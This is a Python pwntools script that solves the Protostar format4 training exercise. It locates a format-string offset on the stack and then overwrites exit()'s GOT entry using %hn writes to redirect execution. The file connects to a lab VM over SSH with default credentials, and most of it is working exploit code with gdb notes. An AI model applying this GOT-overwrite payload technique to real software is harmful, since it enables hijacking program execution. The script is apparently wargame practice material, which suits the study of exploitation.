from pwn import *




# bruteforce until we found our pattern ("AAAA") on the stack
def find_pos():
  
    for i in range(10): 
        s = ssh(host="192.168.160.128" , user="user", password="user")
        format4 = s.run(["/opt/protostar/bin/format4"])   
        payload = 'AAAA' + "%{}$x".format(i) # payload type : %i$x   print the element on the stack at position i in hex
        format4.sendline(payload)
        output=str(format4.recvline())
        if "41414141" in output:
            print("Found position : ",i)
            control_pos=i
            break
    
    
#find_pos() 

control_pos=4




'''
METHOD 1


#value  we want to write : address of  hello 0x080484b4 at 0x08049724 address of EXIT in the GOT 


0x08049726   0x0804   0x10804 - 0x84b4= 33616x
0x08049724   0x84b4   0x84b4 - 8 = 33964

'''



def write_at_offset4_with_hn():
    address_of_exit_GOT= p32(0x08049724)
    s = ssh(host="192.168.160.128" , user="user", password="user")
    format4 = s.run(["/opt/protostar/bin/format4"]) 
    payload =  p32(0x08049724)+ p32(0x08049726)+  b'%33964x' + b"%4$hn" +  b'%33616x' + b'%5$hn'
    format4.sendline(payload)
    print(format4.recvuntil(b'win'))
    format4.close()







#write_at_offset4_with_hn()


#value  we want to write : address of  hello 0x080484b4 at 0x08049724 address of EXIT in the GOT 


'''
METHOD 2

(gdb) x/10i 0x080483ec
0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724
0x80483f2 <exit@plt+6>:	push   0x30
0x80483f7 <exit@plt+11>:	jmp    0x804837c
0x80483fc:	add    BYTE PTR [eax],al
0x80483fe:	add    BYTE PTR [eax],al
0x8048400 <_start>:	xor    ebp,ebp
0x8048402 <_start+2>:	pop    esi
0x8048403 <_start+3>:	mov    ecx,esp
0x8048405 <_start+5>:	and    esp,0xfffffff0
0x8048408 <_start+8>:	push   eax
(gdb) x/x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2

 
exit in GOT points at 0x080483f2 (which is in back in the plt  since exit() is not yet resolve )
One thing we should notice is the heigher bytes are already the bytes that we want : 0x0804
We just need to replace the lowest 2 bytes with 0x84b4

payload : address in GOT (4bytes ) +  (0x84b4 - 4)  + "%4$hn"

'''


def write_at_offset4_with_only_one_hn():
    address_of_exit_GOT= p32(0x08049724)
    s = ssh(host="192.168.160.128" , user="user", password="user")
    format4 = s.run(["/opt/protostar/bin/format4"]) 
    payload =  p32(0x08049724) +  b'%33968x' + b"%4$hn"
    format4.sendline(payload)
    print(format4.recvuntil(b'win'))
    format4.close()



write_at_offset4_with_only_one_hn()
